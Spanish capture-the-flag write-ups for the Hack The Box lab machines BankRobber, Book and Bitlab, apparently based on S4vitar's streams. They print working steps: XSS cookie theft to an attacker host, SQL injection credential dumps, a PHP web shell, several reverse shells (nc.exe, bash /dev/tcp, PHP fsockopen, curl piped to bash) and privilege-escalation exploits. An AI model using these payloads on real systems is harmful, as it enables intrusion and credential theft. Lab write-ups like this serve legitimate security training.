        s4vitar
        ```
    
    - Decodificamos el password

        ```bash
        echo "czR2aXRhcjEyMw==" | base64 -d; echo
        #Output
        s4vitar123
        ```

    Aqui vemos que la cookie unicamente esta encryptada en base64.

1. Intentamos robar la cookie del admin.

    - Creamos un fichero test.js

        ```javascript
        var request = new XMLHttpRequest();
        request.open('GET', 'http://10.10.17.51/?cookie='+document.cookie, true);
        request.send();
        ```

    - Creamos un servidor web con python

        ```bash
        python3 -m http.server 80
        ```

    - Modificamos nuevamente los valores de la transferencia
    
        ```bash
        Amount: 1
        ID of Addressee: 1
        Comment to him/her: <script src="http://10.10.17.51/test.js"></script>
        ```

    Aqui ya vemos la cookie de session del administrador.

1. Decodificamos la cookie del admin.

    ```bash
    php --interactive
    php > echo urldecode("username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D")
    #Output
    username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==

    echo "YWRtaW4=" | base64 -d; echo
    #Output
    admin

    echo "SG9wZWxlc3Nyb21hbnRpYw==" | base64 -d; echo
    #Output
    Hopelessromantic
    ```

1. Nos conectamos a la web como el usuario admin.

Hay un link user.txt que nos muestra un mensaje TODO que seria de mover todos los ficheros al Default Xampp folder.
Buscando por internet vemos que este directorio seria `C:\xampp\htdocs`.

En la pagina principal, vemos un panel de administracion. Aqui vemos 2 cosas,

- Un campo que nos permitiria ejecutar comandos en la maquina victima
- Un campo Search users que es en beta. Nos permite buscar usuarios por su ID

El campo para ejecutar comandos no funcciona porque tendriamos que estar loggeado desde la maquina victima atacando este servicio por localhost.
Ademas con Burpsuite, vemos que esta utilidad lanza una peticion a `/admin/backdoorchecker.php` con un parametro `cmd=...`

Como no podemos hacer gran cosa por el momento, analyzamos el campo de busqueda de usuarios.

```bash
1 -> admin
2 -> gio
3 -> s4vitar
1' -> There is a problem with your SQL syntax
```

### SQL Injection {-}

```bash
1' or 1=1-- - 
#Output
1,admin
2,gio
3,s4vitar
```

Seguimos la guia normal de un SQLI

1. Cuantas columnas hay

    ```bash
    1' order by 100-- -         -> There is a problem with your SQL syntax
    1' union select 1,2-- -     -> There is a problem with your SQL syntax
    1' union select 1,2,3-- -
    #Output
    1,admin
    1,2
    ```

    Vemos que hay 3 columnas y vemos la 1 y la 2.

1. Cual es la base de datos

    ```bash
    1' union select 1,database(),3-- -
    #Output
    1,admin
    1,bankrobber
    ```

1. Cual es el usuario que esta actualmente coriendo la base de datos

    ```bash
    1' union select 1,user(),3-- -
    #Output
    1,admin
    1,root@localhost 
    ```

1. Cual es la version de la base de datos

    ```bash
    1' union select 1,version(),3-- -
    #Output
    1,admin
    1,10.1.38-MariaDB
    ```

1. Cual son las otras bases de datos que existen

    ```bash
    1' union select 1,schema_name,3 from information_schema.schemata-- -
    #Output
    1,admin
    1,bankrobber
    1,information_schema
    1,mysql
    1,performance
    1,phpmyadmin
    1,test
    ```

    S4vi nos adelanta que en la base de datos de bankrobber estan unas credenciales de usuarios, pero que no nos sirben porque ya somos admin.
    miramos por la db mysql

1. Buscamos credenciales

    ```bash
    1' union select 1,group_concat(User,0x3a,Password),3 from mysql.user-- -
    #Output
    1,admin
    1,root:*F435735A173757E57BD36B09048B8B610FF4D0C4
    ```

1. Crackeo de hash con john

    ```bash
    echo "root:*F435735A173757E57BD36B09048B8B610FF4D0C4" > credentials.txt
    john --wordlist=/usr/shar/wordlists/rockyou.txt credentials.txt
    ```

    Vemos que no podemos romper el hash

1. Intentamos leer ficheros

    ```bash
    1' union select 1,load_file("C:\\Windows\\System32\\drivers\\etc\\hosts"),3-- -
    ```

    El fichero `\etc\hosts` no nos interesa en este caso pero hemos podido comprobar si podiamos leer ficheros.


    miramos por el fichero `C:\\xampp\\htdocs\\admin\\backdoorchecker.php` y podemos ver la manera de ejecutar comandos bypasseando los badchars.


La idea aqui seria de ejecutar un comando de typo `cmd=dir|powershell -c "iwr -uri http://10.10.17.51/nc.exe -Outfile %temp%\\nc.exe";%temp%\\nc.exe -e cmd 10.10.17.51 443`.
El problema aqui sigue siendo el echo de no poder lanzar este comando porque no estamos lanzando esta peticion desde el localhost de la maquina victima.



<!--chapter:end:47-BankRobber/47-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### De un XSS a un XSRF par conseguir un RCE para ganar accesso al systema{-}

Esto puede funccionar unicamente si el usuario admin que valida las transacciones esta loggeada al panel de administracion desde la propria maquina victima.

Intentamos y miramos.

1. Creamos un ficher pwned.js

    ```javascript
    var request = new XMLHttpRequest();
    params = 'cmd=dir|powershell -c "iwr -uri http://10.10.17.51/nc.exe -Outfile %temp%\\nc.exe";%temp%\\nc.exe -e cmd 10.10.17.51 443';
    request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
    request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    request.send(params);
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Preparamos el nc.exe y creamos un servidor web con python

    ```bash
    locate nc.exe
    cp /usr/share/sqlninja/apps/nc.exe .
    python3 -m http.server 80
    ```

1. Lanzamos una transaccion

    ```bash
    Amount: 1
    ID of Addressee: 1
    Comment to him/her: <script src="http://10.10.17.51/pwned.js"></script>
    ```

Hemos ganado accesso a la maquina victima como el usuario cortin y podemos visualizar la flag.

```bash
whoami
bankrobber\cortin

type C:\Users\cortin\Desktop\user.txt
```

<!--chapter:end:47-BankRobber/47-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami /priv
```

No tenemos privilegios interesantes como el **SeImpersonatePrivilege**, el **SeLoadPrivilege** o el **SeBackupPrivilege**.
Teniendo este privilegio, podriamos hacer una copia (backup) de seguridad de elemento del systema como el **NTDS** que nos permitirian
recuperar los hashes de los usuarios del systema, entre ellos el usuario Administrator.

```bash
cd C:\Users\Administrator
cd C:\
netstat -nat
```

Aqui vemos un ejecutable llamado `bankv2.exe`. En este caso no lo vamos a analyzar. El **netstat** nos muestra un puerto **910** que no hemos visto
con nmap.

```bash
netstat -ano
tasklist
```

El comando `netstat -ano` nos permite ver el UID de los puertos abiertos y con el comando `tasklist`, miramos que servicio core para este UID.
En este caso vemos que es el mismo **bankv2.exe**.

Miramos con el **nc.exe** lo que es.

```bash
%temp%\nc.exe 127.0.0.1 910
#Output
Please enter your super secret 4 digit PIN code to login:
```

Como el puerto esta interno a la maquina, vamos a tirar de **chisel** para exponerlo a nuestra maquina de atacante y vamos a bruteforcear el pin con 
un script en python.

1. Descargamos chisel

    ```bash
    wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz
    mv chisel_1.7.6_windows_amd64.gz chisel.exe.gz
    gunzip chisel.exe.gz
    ```

1. Transferimos chisel a la maquina victima

    - Desde la maquina de atacante

        ```bash
        python3 -m http.server 80
        ```

    - Desde la maquina victima

        ```bash
        cd %temp%
        powershell iwr -uri http://10.10.17.51/chisel.exe -OutFile C:\Windows\Temp\chisel.exe
        ```

1. Preparamos el chisel para linux en la maquina de atacante

    ```bash
    git clone https://github.com/jpillora/chisel/
    cd chisel
    go build -ldflags "-s -w" .
    upx chisel

    ./chisel server --reverse --port 1234
    ```

1. Lanzamos el cliente desde la maquina victima

    ```bash
    chisel.exe client 10.10.17.51:1234 R:910:127.0.0.1:910
    ```

Ahora ya tenemos accesso al puerto 910 de la maquina victima desde nuestra maquina. 

Ya podemos crear un script en python para que ataque este puerto. Pero primero creamos un diccionario de pins con crunch

```bash
crunch 4 4 -t %%%% > pins.txt
```

Creamos el `exploit.py`

```python
#!/usr/bin/python3

import pdb
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler

def tryPins():
    f = open("pins", "r")

    p1.log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    for pin in f.readlines():
        p1.status(b"Probando con PIN " + pin.strip('\n').encode())

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 910))

        data = s.recv(4096)

        s.send(pin.encode())

        data = s.recv(1024)

        if "Access denied" not in data:
            p1.success(b"El PIN es " + pin.strip('\n').encode())
            sys.exit(0)

if __name__ == '__main__':
    tryPins()
```

Si lanzamos el script, encontramos el pin.

Vemos que podemos ejecutar transferencia de e-coin con este programa, intentamos cosas

```bash
Please enter the amount of e-coins you would like to transfer:
[$] 10
[$] Transfering $10 using our e-coin transfer application.
[$] Executing e-coin transfer tool: C:\Users\Documents\transfer.exe

Please enter the amount of e-coins you would like to transfer:
[$] asfessefseafews
[$] Transfering $asfessefseafews using our e-coin transfer application.
[$] Executing e-coin transfer tool: C:\Users\Documents\transfer.exe

Please enter the amount of e-coins you would like to transfer:
[$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA using our e-coin transfer application.
[$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Aqui no parece que estamos frente a un BufferOverflow pero vemos que a partir de una serie de caracteres, sobre escribimos el ejecutable que permite
enviar los e-coins.

1. Creamos un pattern

    ```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
    #Output
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    ```

1. Lanzamos el ejecutable con esta cadena

    ```bash
    Please enter your super secret 4 digit PIN code to login:
    [$] 0021
    [$] PIN is correct, access granted!
    Please enter the amount of e-coins you would like to transfer:
    [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A using our e-coin transfer application.
    [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    ```

1. Miramos el offset

    ```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -q 0Ab1
    #Output
    [+] Exact match at offset 32
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el binario con el input malicioso

    ```bash
    python -c 'print "A"*32 + "C:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443"'
    #Output
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443

    Please enter your super secret 4 digit PIN code to login:
    [$] 0021
    [$] PIN is correct, access granted!
    Please enter the amount of e-coins you would like to transfer:
    [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443
    [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443 using our e-coin transfer application.
    [$] Executing e-coin transfer tool: C:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443
    ```

Ya vemos que hemos ganado acceso al systema como `nt authority\system` y podemos ver la flag.

<!--chapter:end:47-BankRobber/47-04-PrivilegeEscalation.Rmd-->

# Book {-}

## Introduccion {-}

La maquina del dia se llama Book.

El replay del live se puede ver aqui

[![S4vitaar Book maquina](https://img.youtube.com/vi/0vmm0I644fs/0.jpg)](https://www.youtube.com/watch?v=0vmm0I644fs)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:48-Book/48-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.176
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.176
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.176 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,443,445,3306 10.10.10.176 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?            |
| ------ | -------- | ------------------ | --------------------- |
| 22     | ssh      | Direct connection  | credenciales o id_rsa |
| 80     | http     | Web Fuzzing        |                       |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.176
```

Es un Apache 2.4.29 Ubuntu que usa PHP 7.3.4. Vemos un password field que nos hace pensar que estamos
en un panel de inicio de session.

#### Mini fuzzing con http-enum {-}

```bash
nmap --script http-enum -p80 10.10.10.176 -oN webScan
```

Vemos un directorio `/admin`

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.176`, Vemos una pagina que nos permite loggear o registrar. En la pagina `http://10.10.10.176/admin` tenemos un
otro panel de inicio de session para el panel de administracion.

Empezamos por crear una cuenta
y nos loggeamos.

Aqui vemos una biblioteca. Podemos

- ver libros en pdf
- añadir un libro a la coleccion
- contactar el administrator

Haciendo Hovering a las imagenes de la pagina `books.php`, vemos que hay un link a `http://10.10.10.176/download.php?file=1`

Miramos con curl si es vulnerable a LFI

```bash
curl -s -X GET "http://10.10.10.176/download.php?file=/etc/passwd"
curl -s -X GET "http://10.10.10.176/download.php?file=/etc/passwd -L"
curl -s -X GET "http://10.10.10.176/download.php?file=../../../../../../etc/passwd"
curl -s -X GET "http://10.10.10.176/download.php?file=../../../../../../etc/passwd -L"
```

No parece ser vulnerable en este caso.

En las paginas `/collections.php` y `/contact.php` vemos que las request necessitan ser validadas por otro usuario. Miramos si es vulnerable a un XSS

```bash
python3 -m http.server 80
```

y ponemos en los inputs de la web 

```bash
<script src="http://10.10.17.51/book" />
<script src="http://10.10.17.51/title" />
<script src="http://10.10.17.51/message" />
```

No parece ser vulnerable a XSS tampoco.

Miramos si podemos burlar el login. Nos desloggeamos y miramos lo que podemos hacer desde el panel de inicio de session.
Intentamos en el panel login poner usuarios por defecto.

```bash
email: admin@book.htb
password: admin
```

Vemos que el usuario admin existe pero la contraseña no es la buena.

Miramos si el panel de inicio de session es vulnerable a un **SQLI**. lo hacemos desde burpsuite.

```bash
email=admin@book.htb'&password=admin
email=admin@book.htb' and 1=1-- -&password=admin
email=admin@book.htb' and 1=1#&password=admin
email=admin@book.htb' or sleep(5)&password=admin
```

No parece que este panel sea vulnerable a **SQLI**.

Probamos si es vulnerable a **Type Juggling**.

```bash
email[]=admin@book.htb&password[]=admin
```

Tampoco parece ser vulnerable a un **Type Juggling**

<!--chapter:end:48-Book/48-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### SQL Truncate {-}

**SQL Truncate** es una vulnerabilidad que viene del echo que un input de usuario no esta sanitizado en terminos de *length* y que 
la columna corespondiente en el SQL esta definida con un tamaño. Esta vulnerabilidad permite al atacante modificar el comportamiento
de la peticion sql. En un caso como este, y mas precisamente en el panel de registo, en vez de crear un nuevo usuario, podriamos como
atacante cambiar la contraseña de este mismo usuario superando el tamaño definido en SQL.

Si el tamaño definido por la columna `email` es `varchar(16)`, si como atacante ponemos el email `admin@book.htb` con espacios al final mas
cualquier carater y que en este caso excede este tamaño de 16, podriamos cambiar su contraseña.

Si en burpsuite creamos un usuario con la data

```bash
name=admin&email=admin@book.htb&password=admin123
```

la respuesta al lado del servidor nos dice que el usuario ya existe. pero si excedemos el tamaño definido en la columna de la tabla SQL con
una peticion 

```bash
name=admin&email=admin@book.htb               .&password=admin123
```

la respuesta es un 302 Found.

Si nos connectamos ahora como `admin` y con la contraseña `admin123`, podemos entrar como el usuario admin.
En este caso vamos directamente a la url `http://10.10.10.176/admin` para entrar en el panel de administracion de la web.

Aqui Vemos que podemos ver los usuarios registrados, los mensajes enviados por los usuarios los feedbacks y la collections.

Aqui nos llama la atencion el `/admin/collections.php` porque hay un link a un pdf de la collectiones de la web.
Si nos acordamos bien, el contenido es muy parecido a las entradas que teniamos como usuario normal a la hora de crear una nueva
collection.

Si nos connectamos en una nueva pagina web al panel normal (el donde podiamos crear una nueva collection) y creamos una nuevamente
con

```bash
title: test
author: test
un fichero txt en el file upload
```

Podemos ver que esta collection a sido creada y aparece en el pdf de la collections de panel de administracion y nos reporta la data title y author.

Buscamos en internet si existe un html 2 pdf exploit.

### html2pdf exploit {-}

Buscamos por `html 2 pdf exploit`, no vemos gran cosa. Cambiamos la busqueda por vulnerabilidades conocidas como RCE LFI XSS
y encontramos un un [Local File Read via XSS in Dynamically Generated PDF](https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/)

Aqui vemos que con la inclusion de un `<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>`
podriamos ejecutar un LFI.

Si lo ponemos en el input Title y author, podemos ver el `/etc/passwd` de la maquina en el pdf generado.

En este caso vemos que hay un usuario `Reader` que tiene una bash. Miramos si podemos leer su `id_rsa`

`<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>`

Ya podemos ver su llave privada y connectarnos por ssh.

<!--chapter:end:48-Book/48-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Conneccion por ssh con id_rsa {-}

1. Copiamos el contenido de la id_rsa del pdf en un fichero id_rsa en nuestra maquina.
1. Le ponemos los derechos necesarios

    ```bash
    chmod 600 id_rsa
    ```

1. Nos connectamos

    ```bash
    ssh reader@10.10.10.176 -i id_rsa
    ```

Y ya estamos connectados como el usuario **reader** y podemos leer la flag.

<!--chapter:end:48-Book/48-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
ls -l
cd backups
ls -l
cat access.log
cat access.log.1
```

Aqui no tenemos mucha cosa que podemos hacer. Uzamos **pspy** para investigar el systema.

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
./pspy64
```

pspy nos muestra que hay un `/usr/sbin/logrote` que se ejecuta a interval regular de tiempo.

```bash
uname -a
logrotate -v
```

En la maquina de atacante buscamos un exploit logrotate para escalada de privilegios

```bash
searchsploit logrot
searchsploit -m 47466
mv 47466.c logrotten.c
```

Copiamos el contenido en un fichero de la maquina victima y le quitamos todos los commentarios.

```bash
gcc logrotten.c -o logrotten
```

Creamos un fichero payloadfile malicioso

```bash
nano payloadfile


#!/bin/bash

php -r '$sock=fsockopen("10.10.17.51",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Nos ponemos en escucha por el puerto 443

```bash
nc -nlvp 443
```

Lanzamos el script

```bash
logrotten -p payloadfile /home/reader/backups/access.log
```

Nos conectamos nuevamente por ssh a la maquina victima para modificar el fichero `access.log`

```bash
ssh reader@10.10.10.176 -i id_rsa

echo "s4vitar" > backups/access.log
```

Esperamos un poco y ganamos accesso al systema. Pero se desconecta bastante rapido. Volvemos nuevamente a lanzar el script
y rapidamente colamos un `chmod 4755 /bin/bash` de seguida que ganamos accesso al systema antes que se desconnecte.

Desde una shell ssh ya podemos lanzar un `bash -p` y leer el fichero `root.txt`

<!--chapter:end:48-Book/48-04-PrivilegeEscalation.Rmd-->

# Bitlab {-}

## Introduccion {-}

La maquina del dia se llama Bitlab.

El replay del live se puede ver aqui

[![S4vitaar Bitlab maquina](https://img.youtube.com/vi/sZFrgbRjOfg/0.jpg)](https://www.youtube.com/watch?v=sZFrgbRjOfg)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:49-Bitlab/49-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.114
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.114
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.114 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.114 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | tcp      | Conneccion directa | creds      |
| 80     | tcp      | Web, Fuzzing       |            |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.114
```

Hay una redirection hacia la routa `http://10.10.10.114/users_sign_in` y vemos un Cookie `_gitlab_session`.
Vemos que esta hosteada sobre un NGINX. 


#### Checkear la web {-}

Si entramos en la url `http://10.10.10.114`, Vemos la pagina de inicio de session de Gitlab pero no podemos registrarnos. Solo nos podemos loggear.
Intentamos con loggins por defecto pero no llegamos a conectarnos.
Como la enumeracion con **NMAP** nos a mostrado un `robots.txt`, miramos lo que hay por esta routa. Vemos una serie de routas ocultadas. Intentamos ver unas
cuantas y la unica que nos muestra algo interesante es la routa `http://10.10.10.114/help` donde vemos un fichero `bookmark.html`.

Hay una serie de links y haciendo *Hovering* vemos que el link Gitlab Login nos sale un script un javascript. Analyzando el codigo fuente, vemos una declaracion
de variable en hexadecimal. La copiamos y la decodificamos para ver lo que es.

```bash
echo "var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64
&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;]" | sed s/\&quot/\'/g
#Output
var _0x4b18=[';value';,';user_login';,';getElementById';,';clave';,';user_password';,';11des0081x';]
```

Como tenemos un usuario y una contraseña nos connectamos al panel de inicio.


<!--chapter:end:49-Bitlab/49-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


### Gitlab {-}

Como hemos podido connectarnos, analyzamos el contenido del gitlab. 
Vemos que hay 2 repositorios. En el menu Activity vemos cosas interessante como una especie de **CI/CD** que permite
tras una merge request updatear el proyecto *Profile* automaticamente. Ademas la routa `/profile` estaba ocultada por el
**robots.txt**.

En el menu Snippets vemos un codigo php

```php
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
```

#### Subimos un archivo php que nos permite ejecutar comandos {-}

Creamos un archivo `s4vishell.php` en el proyecto profile.

```php
<?php
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
?>
```

Hacemos un commit con este fichero y se nos crea una rama diferente de la **master** lo que significa que tenemos que crear una **Merge request**.
Una vez esta **Merge Request** creada, Vemos que la podemos acceptar sin problemas porque el proyecto nos apartenece.

Si vamos a la url `http://10.10.10.114/profile/s4vishell.php?cmd=whoami` Vemos que tenemos possibilidad de ejecutar comandos a nivel de systema.

<!--chapter:end:49-Bitlab/49-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con la s4vishell.php {-}

1. Creamos un archivo index.html

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.17.51/443 0>&1
    ```

1. Creamos un servidor web con python

    ```bash
    python3 -m http.server 80
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Cambiamos la url por 
    
    ```bash
    http://10.10.10.114/profile/s4vishell.php?cmd=curl 10.10.17.51|bash
    ```

Ya hemos ganado accesso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### User Pivoting {-}

Como el **user.txt** del usuario **clave** no es permitido a nivel de lectura por el usuario **www-data** tenemos que convertirnos en el usuario
**clave**.

Aprovechamos el snippet encontrado para ver lo que hay en la base de datos **postgresql**.

```bash
which psql
which php
```

Vemos que la utilidad **psql** no existe en la maquina victima, pero como tenemos acceso a la utilidad **php**, tiramos del `php --interactive`

```bash
php --interactive

$connection = new PDO('pgsql:dbname=profiles;host=localhost', 'profiles', 'profiles');
$connect = $connection->query("select * from profiles");
$results = $connect->fetchAll();
print_r($results);
```

Aqui vemos la contraseña del usuario clave. Parece ser una contraseña en base64.

```bash
echo 'c3NoLXN0cjBuZy1wQHNz==' | base64 -d; echo
#Output
ssh-str0ng-p@ss
```

Intentamos connectarnos con ssh

```bash
ssh clave@10.10.10.114
password: ssh-str0ng-p@ss
```

No nos podemos connectar pero el doble igual nos parece un poco raro. Intentamos otra vez pero con la contraseña tal cual, sin decodificacion base64.

```bash
ssh clave@10.10.10.114
password: c3NoLXN0cjBuZy1wQHNz==
```

Ya podemos conectar y leer la flag.

<!--chapter:end:49-Bitlab/49-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root/
id
sudo -l
ls -l
```

No tenemos privilegios claramente definida pero un fichero no llama la atencion. Este fichero que es un `RemoteConnection.exe`, un fichero
windows en una maquina Linux.

Nos descargamos el fichero uzando un base64

1. En la maquina victima

    ```bash
    base64 -w 0 `RemoteConnection.exe ; echo
    ```

1. Copiamos el hash y lo colamos en la maquina de atacante 

    ```bash
    bash
    echo "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZS
    BydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADAty75hNZAqoTWQKqE1kCqF5jYqoXWQKrroN6qhdZAquug6qqX1kCq66DcqoDWQKrroOuqgdZAqo2u06qD1kCqhNZBqsPWQKrroO+qhd
    ZAquug3aqF1kCqUmljaITWQKoAAAAAAAAAAFBFAABMAQUA5hFAXQAAAAAAAAAA4AACAQsBCgAAGgAAABgAAAAAAAAzIgAAABAAAAAwAAAAAEAAABAAAAACAAAFAAEAAAAAAAUAAQAAAA
    AAAHAAAAAEAABDjAAAAwBAgQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAhDYAAHgAAAAAUAAAtAEAAAAAAAAAAAAAAAAAAAAAAAAAYAAApAIAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAgDIAAEAAAAAAAAAAAAAAAAAwAAAQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABvGQAAABAAAAAaAAAABAAAAAAAAAAAAAAAAAAAIAAAYC
    5yZGF0YQAAIg4AAAAwAAAAEAAAAB4AAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAPQDAAAAQAAAAAIAAAAuAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAAC0AQAAAFAAAAACAAAAMAAAAA
    AAAAAAAAAAAAAAQAAAQC5yZWxvYwAAUgMAAABgAAAABAAAADIAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMcBeDJAAP8l6DBAAMzMzMxVi+xWi/
    HHBngyQAD/FegwQAD2RQgBdApW/xXQMEAAg8QEi8ZeXcIEAMzMzMzMzMxVi+xq/2iYKEAAZKEAAAAAUIPsJKEYQEAAM8WJRfBTVlCNRfRkowAAAAAzwIlF0MdF/AEAAACJReSIRdSNRS
    RQg8j/M9uNTdTHRegPAAAA6HwGAADGRfwCi0U0i00YO8EPg48AAACLTeSDy/+D+f9zAovZg8n/K8g7yw+GEAEAAIXbdGaNNBiD/v4PhwABAACLTTg7zg+D1wAAAFBWjVUkUuh6CQAAi0
    U0i004hfZ0OoN96BCLVdRzA41V1IP5EItNJHMDjU0kU1IDyFHohxYAAItFJIPEDIN9OBCJdTRzA41FJMYEMACLRTSLTRg7wQ+Ccf///zPbM8A7y3Yni00IuhAAAAA5VRxzA41NCIt1JDl
